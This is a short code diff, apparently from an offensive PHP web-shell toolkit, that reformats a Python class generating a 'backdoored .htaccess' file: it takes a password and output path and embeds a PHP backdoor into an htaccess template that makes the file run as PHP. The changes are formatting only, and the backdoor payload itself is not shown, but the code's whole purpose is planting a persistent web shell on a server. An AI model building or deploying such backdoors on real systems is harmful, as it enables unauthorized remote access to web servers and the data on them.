@@ -16,15 +16,17 @@ AddType application/x-httpd-php .htaccess
 # %s #
 '''
 
+
 class Htaccess(Phpgenerator):
+
     """Generate backdoored .htaccess"""
 
     def _set_args(self):
         self.argparser.add_argument('pass', help='Password')
-        self.argparser.add_argument('lpath', help='Path of generated backdoor', default= '.htaccess', nargs='?')
+        self.argparser.add_argument(
+            'lpath', help='Path of generated backdoor', default='.htaccess', nargs='?')
 
     def _prepare(self):
-        
-        self.args['encoded_backdoor'] = htaccess_template % Backdoor(self.args['pass']).backdoor.replace('\n', ' ')
 
-        
+        self.args['encoded_backdoor'] = htaccess_template % Backdoor(
+            self.args['pass']).backdoor.replace('\n', ' ')
